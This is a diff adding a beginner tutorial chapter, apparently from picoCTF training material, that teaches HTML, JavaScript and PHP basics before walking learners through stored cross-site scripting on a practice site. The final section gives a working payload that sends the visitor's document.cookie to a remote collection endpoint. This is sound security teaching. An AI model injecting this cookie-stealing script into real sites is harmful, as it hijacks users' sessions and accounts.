@@ -1,0 +1,339 @@
+
+
+== Web Exploits
+
+At this point, you have already learned python, so you have an idea on how a programming language works. We are more than ready to begin to learn Web!
+
+=== Html
+
+Before diving into Web Exploits, you need to understand how a website works. Many years ago, the web was used to visit static pages that did not have interactive features. They just showed information. To do a static page, it is enough to write some lines of HTML. What is HTML? First of all, it is not a programming language. Html means HyperText Markup Language, and we use it to determine the font size, colors, margins, or similar features in a web page. When an html file is accessed in a browser like Firefox, Chrome or whatever browser you like, the browser presents the text according to the html on it. Your browser can access an html file locally. Locally means that the file could be in your laptop ́s file system. Also, it could access the file remotely through the Internet. Let’s see an example of creating a simple html and access it locally:
+
+
+. On your computer, create a folder called “picoexample” and then, inside that folder, create a text file and name it “myFirstPage.html”. You can do this on Notepad on Windows, Textedit on Mac, or any text editor from Linux. It is important that the extension is “.html”. It cannot be ”.html.txt” or something that is not exactly “.html”. If you don’t see the extension in your operating system, this is a good opportunity too google how to make it appear to be able to modify it. Remember, for this simple obstacles that might appear along the way, google is the answer.
+
+. Edit the content in a text editor and write: Hello World!
+
+. Save the file
+
+. Open the file in any browser. To do that, you can right click on the file, and then select “open width” and choose the browser you want. You should see a page like the following:
+image:images/image13.png[image,width=624,height=496]
+
+. Now, in the text editor, modify the content of the file and replace the text by: <b>Hello World!</b>
+. Save the file on the text editor. Then, open the file in the browser again, or you can simply click refresh on your browser. Since it already has opened the file, you will see the message in bold, in page similar to this:
+
+image:images/image27.png[image,width=624,height=496]
+
+
+You just created a page with a very simple HTML that made your message appeared in bold. Note that <b> is the opening tag, </b> is the closing tag. Analyze the difference between the opening and closing tag. What do you see? The closing tag is usually the same as the opening tag, but you include “/” like we just did. We just used an html tag to tell the browser we want some specific text in bold. Html is just a bunch of tags that allow us to do similar things.
+
+Now let’s make a page with more fields so you can get a sense of more tags and of the structure of a bigger page. Use the following HTML code to replace the content of the file you are editing:
+
+
+
+
+[source,html]
+<html>
+<header>
+   <title>This is a picoCTF html Example</title>
+</header>
+<body>
+   <h1>This is a Heading</h1>
+   <h2>This is a smaller Heading</h2>
+   <p>This is a paragraph.</p>
+   The following is an image:<br>
+   <img src="picologo.png" />
+</body>
+</html>
+
+
+Now, as we were doing before, save the file in the text editor and click refresh on the browser. You probably see something like this:
+
+image:images/image17.png[image,width=624,height=496]
+
+If you read the html code and try to analyze its content, you would realize the following:
+
+* The title shown in that tab of the browser “This is a picoCTF html Example”, appears there because you put that text inside in the <title></title> tags.
+* <h1> Is used to create a big heading
+* <h2> creates a heading a little smaller than <h1>
+* The <header> tags are used to group introductory content, in this case the title, but if you remove this tag, you will not see much change in our page. Do the experiment of removing it. If you only remove the opening or closing tag, that would cause and html error, so make sure to delete the opening tag and closing tag.
+* The <body> tags are used to group the main content of the page. Also, if you remove them, you will not see much change in our page.
+
+Now, you must have noted the <img> tag is not showing any image as it should. Why? Let’s analyze the element img:
+
+[source,html]
+<img src="picologo.png" />
+
+First you see there is not opening or closing tag, there is just one tag. This is ok for an image. As you can see, it has an *attribute* called ”src”, which means source. We are assigning to “src” the value “picologo.png”. Our html is gonna try to access a file called “picologo.png” in the same folder as “myFirstPage.html” is contained, which is the folder we name at first “picoexample”. There is no image called “picologo.png”, so the browser has nothing to show. Copy and paste an image to the folder and name it “picologo.png”. Don’t forget that the extension has to be ”.png”. If you successfully created the image “picologo.png” in the folder, and refresh the browser, you will see the following, of course, with your own custom image:
+
+image:images/image22.png[image,width=624,height=496]
+
+A fundamental part of web site are the links. The link tag is *<a>*, the following is an example of a link directed to google:
+
+[source,html]
+<a href="http://google.com" > Go to google! </a>
+
+Use that element and put it in your code to make a link to the web site you want. Now practice by adding more html tags and images in your page! This is a reference in which you can find more html tags:
+
+https://www.w3schools.com/tags/[[.underline]#https://www.w3schools.com/tags/#]
+
+=== JavaScript
+
+To make pages more interactive, JavaScript is commonly used. JavaScript is a programming language! We can do algorithms using it. JavaScript is executed in your browser. For example, when you visit a website, the JavaScript code is downloaded along the HTML and it only executes once it is loaded in your browser. When you visit a page, you are downloading an html file and your browser interprets the tags and prints the text and images as we learned before. This image illustrates that process:
+
+image:images/image26.png[image,width=624,height=357]
+
+If that file happens to contain JavaScript, your browser will execute it. Let’s look at an example. In the same folder “picoexample”, create a file called “myFirstJS.html“ using a text editor. Then, put the following content in the file:
+
+[source,html]
+<html>
+    <header>
+        <title>This is a picoCTF JS Example</title>
+        <script>
+            alert("Hello picoCTF");
+        </script>
+    </header>
+    <body>
+        <h1>JavaScript example</h1>>
+    </body>
+</html>
+
+
+Save the file. As soon as you open the page, you will see an alert showing “Hello picoCTF”, something like this:
+
+image:images/image5.png[image,width=624,height=496]
+
+If you analyze the file, you will note that the magic is happening in this element:
+
+[source,html]
+<script>
+    alert("Hello picoCTF");
+</script>
+
+Whatever you put inside the tags “<script> </script>” will be tried to execute by the browser. Since JavaScript is a programming language, we should be able to do some arithmetic. Replace the string “Hello picoCTF” by an arithmetic operation, like 8*8, like this:
+
+[source,html]
+<script>
+    alert(8*8);
+</script>
+
+Note that we only use quotes when we want to use a string. In arithmetic operations we don’t use quotes. Save the file, and refresh the browser as we always do. You should see the following:
+
+image:images/image18.png[image,width=624,height=496]
+
+Click Ok in the alert message to make it go away. Anything you write in JavaScript or html, will be visible for any user that access your page in a browser. To see the html and Javascript code in your browser, right click the page and then “View Page Source”
+
+image:images/image10.png[image,width=402,height=296]
+
+You will see the javascript code you just wrote:
+
+image:images/image6.png[image,width=474,height=376]
+
+This is a very important thing! Never put a secret in your javascript code. If someone does it, that will be an open door for hacking.
+
+Now let’s use some more elaborated code. We are going to make a page that adds two numbers input by the user and shows the result in an alert. The code is the following:
+
+[source,html]
+<html>
+    <header>
+        <title>This is a picoCTF JS Example</title>
+        <script>
+            function myFunctionSum(){
+                var number1 = document.getElementById("number1").value;
+                var number2 = document.getElementById("number2").value;
+                var result = number1 + number2;
+                alert(result);
+            }
+        </script>
+    </header>
+    <body>
+        <h1>JavaScript example to add2 numbers</h1>
+        Input the first number<br> 
+        <input type="text" id="number1"  ><br>
+        Input the second number<br> 
+        <input type="text" id="number2" ><br>
+        <button onclick="myFunctionSum()"> Show alert! </button>
+    </body>
+</html>
+
+Put it on a text file and save it and open it on a browser as usual. You should see this:
+
+image:images/image3.png[image,width=492,height=390]
+
+If you put the numbers in each text field, and click “show alert!”, you will see the alert with the result. For this example let’s input 4 and 2 in the text fields, you should see:
+
+image:images/image23.png[image,width=510,height=405]
+
+Now that you know what the code does, let’s analyze the new lines of the code. In this line we have an input tag:
+
+[source,html]
+<input type="text" id="number1" ><br>
+
+As you can see, it is of type text, and it has an “id” equal to “number1”. This “id” is something we arbitrarily define to be able to access the content of this text input in JavaScript. This line:
+
+[source,html]
+<button onclick="myFunctionSum()"> Show alert! </button>
+
+Is responsible for calling the function “myFunctionSum()” when the button is clicked. The function has to be defined inside the script tags. With your knowledge of programming, you should be able to read the function and understand at a general level what each line is doing:
+
+[source,javascript]
+function myFunctionSum(){
+    var number1 = document.getElementById("number1").value;
+    var number2 = document.getElementById("number2").value;
+    var result = number1 + number2;
+    alert(result);
+}
+
+Modify the file to multiply the two numbers. When you are done, include a new third input number! At this point you should be able to do it on your own. Be careful with the syntax, remember that a single character wrong will break the whole code.
+
+=== Server code
+
+As we said previously, javascript is executed only in the browser. But, what if you want to do calculations and store data in the remote server? For example, when you login into a Website, your user and password has to be verified on the server. The password is stored in the server and should not travel outside of it for the sake of security. If you would verify a password on JavaScript, you would be able to see it on your browser in the same way you can see any JavaScript. There are several programming languages that can be executed on the server, for example:
+
+* Python
+* Java
+* PHP
+* C
+* C Sharp
+* And many more...
+
+For our examples, we will begin using PHP, not because we think is a great language, but because most of the websites on the Internet use it and it is very easy to learn and deploy. As a hacker, you would generally have to learn all the languages you can because different Websites are made on different languages, as well as CTF challenges that try to simulate real life! The more a language is used, the more likely you will have to attack a website made with it. However, the vulnerabilities we will be explaining can happen in any programming language, because they are not a fault of the language, but a fault of the programmer that did the website.
+
+Suppose you have a text file named hello.html, containing:
+
+[source,html]
+<b>Hello World!</b>
+<script> alert('Hello World from JavaScript!'); </script>
+<?php
+    echo "Hello World from PHP!";
+?>
+
+If the server supports PHP, everything inside *<?php ?>* will be understood as PHP code and run by the server, not by the browser.
+
+Look at the following image carefully to understand what happens:
+
+image:images/image36.png[image,width=624,height=345]
+
+If you open a file with that content on your laptop, the PHP code will not be executed, because your laptop is not a PHP server (if you have not made it one). So, to execute PHP you need to make your laptop a server. But for the time being, we can use the following simulator:
+
+https://www.w3schools.com/php/phptryit.asp?filename=tryphp_intro
+
+Access that link, and you will see an html file with PHP code, that when is run, prints "My first PHP script!". Modify the code to additionally print the date, so below the line
+
+[source,php]
+echo "My first PHP script!";
+
+Add the line
+
+[source,php]
+echo date("H:i:s");
+
+According to what you have learned so far, that time is from the clock on your computer? Or the time of the clock in the server?
+
+...PHP is server side code, so that time is from the clock on the server!
+
+Now let’s make an experiment, and add another line with this php code:
+
+[source,php]
+echo "<script> alert('Hello World from JavaScript!'); </script>";
+
+That string echoed in PHP, has javascript code. Is the JavaScript alert shown? What happened? As expected, anything printed on php, will become an integral part of the html downloaded file, so the javascript will be executed. This opens the door for the famous attack of Cross Site Scripting (XSS).
+
+=== Cross Site Scripting (XSS)
+
+After you Login into a Website, the Website needs a way to know that any request coming from your browser is coming from a user that previously logged in, without the need to send the user-password again. To do that, the website can send to your browser a secret random value after login. That value is generally stored in a cookie or in javascript local storage. For this example, let’s pretend it is stored in a cookie, which is simply a variable in your browser that can retain data. If a Website sets a specific cookie in your browser, your browser automatically re-sends that cookie in each request to the website. If a Website only uses cookies to retain a session, and if a hacker can steal the authentication cookie from you, they could pretend to be you! At least until the cookie expires. Note that only using cookies for autentication will open the possibility of Cross Site Request Forgery (CSRF), but this will be explained later, for now let’s focus on XSS.
+
+Suppose you are a hacker in a social network. When you create your account, instead of using your name, you input javascript code. When a friend of yours visit your profile, the WebSite will try to print your name, but your name is actually javascript code, so the browser might execute that javascript code. In that way, you could execute your own javascript on your friend’s browser!
+
+When you get to execute javascript in someone else’s browser, you can read their authentication data, which can be a secret value placed on a cookie or javascript local storage after a user login. At that point, your friend’s account would probably be compromised!
+
+An important skill to have, is to use the browser debugger. For this explanation we will use Firefox. You can download an install Firefox here:
+
+https://www.mozilla.org/en-US/firefox/new/[[.underline]#https://www.mozilla.org/en-US/firefox/new/#]
+
+Note: If you really don’t want to use Firefox, every browser has a debugger, so you just have to google how to use it. It will not be that different.
+
+Using Firefox, input your name and some text in the description in the following link:
+
+http://www.samuelsabogalpardo.com/pico/sign_up.php[[.underline]#http://www.samuelsabogalpardo.com/pico/sign_up.php#]
+
+Open another tab and visit the following link. You should see your name and description:
+
+http://www.samuelsabogalpardo.com/pico/tableusers.php[[.underline]#http://www.samuelsabogalpardo.com/pico/tableusers.php#]
+
+Now, in the Firefox Menu, click “Web Developer” and then click “Debugger”. You should see a pane like the following:
+
+image:images/image15.png[image,width=624,height=446]
+
+In that pane, click “storage”. At the left click “cookies” and click the domain you are currently on. You will see a cookie that has your name in the value!
+
+image:images/image25.png[image,width=624,height=370]
+
+You can only see your cookie. Other users would see their cookie with their name. For this experiment, you will steal your own cookie. But with the same method, you could steal the cookie of someone else.
+
+For now, access this link again:
+
+http://www.samuelsabogalpardo.com/pico/sign_up.php[[.underline]#http://www.samuelsabogalpardo.com/pico/sign_up.php#]
+
+Create a new user that has you name, but instead of the description has the following code:
+
+<script> alert('I just injected Javascript!'); </script>
+
+If you navigate this link again, you will see your javascript code triggered:
+
+http://www.samuelsabogalpardo.com/pico/tableusers.php[[.underline]#http://www.samuelsabogalpardo.com/pico/tableusers.php#]
+
+Like this:
+
+image:images/image16.png[image,width=624,height=370]
+
+You just verified that you can inject javascript in the website. Now we are going to inject javascript that will steal the cookie. Create another user in the same link for creating users:
+
+http://www.samuelsabogalpardo.com/pico/sign_up.php[[.underline]#http://www.samuelsabogalpardo.com/pico/sign_up.php#]
+
+But now, put this JavaScript code in the description:
+
+[source,javascript]
+<script src="https://code.jquery.com/jquery-3.4.1.min.js"> </script>
+<script>
+$.get(
+    "http://www.samuelsabogalpardo.com/pico/insert.php",
+    {cookie : document.cookie, hackername : 'YourName'},
+    function(data) {
+        alert("I just stole the cookie!");
+    }
+);
+
+</script>
+
+Let’s understand the code. The first line, imports a library called jquery that allow us to do requests and send data from javascript to a service:
+
+[source,javascript]
+<script src="https://code.jquery.com/jquery-3.4.1.min.js"> </script>
+
+Then, we are just sending the cookie to a remote service that is made to receive cookies from this exercise. That service receive two variables: “cookie” and “hackername”. The value of the variable cookie will be “document.cookie”. Here, instead of “=”, we use “:” to assign a value to a variable. Using document.cookie you access the cookies from javascript, so that should contain the cookie you want to steal. The variable hackername simply has assigned a name. You could replace the string “YourName” with your actual name. Remember that a string has to be inside quotes in javascript.
+
+The function:
+[source,javascript]
+function(data){
+    alert("I just stole the cookie!");
+}
+
+Is simply a function that will be executed after the request is sent to the service, and will alert a message.
+
+Now visit this site again:
+
+http://www.samuelsabogalpardo.com/pico/tableusers.php[[.underline]#http://www.samuelsabogalpardo.com/pico/tableusers.php#]
+
+When a user visits that site is when the javascript is executed and the cookie stolen. You should see the message:
+
+image:images/image14.png[image,width=624,height=380]
+
+If you injected scripts previously, all those scripts are stored in the web site, and will be executed in the order you injected them when the page that prints them is visited.
+
+Now you should be able to see the cookie you stole here:
+
+http://www.samuelsabogalpardo.com/pico/tablestolen.php[[.underline]#http://www.samuelsabogalpardo.com/pico/tablestolen.php#]
+
+image:images/image21.png[image,width=624,height=380]
+
+At this point you should have some understanding on how a website works. You are ready to begin to do more challenges on the pico gym for Web!
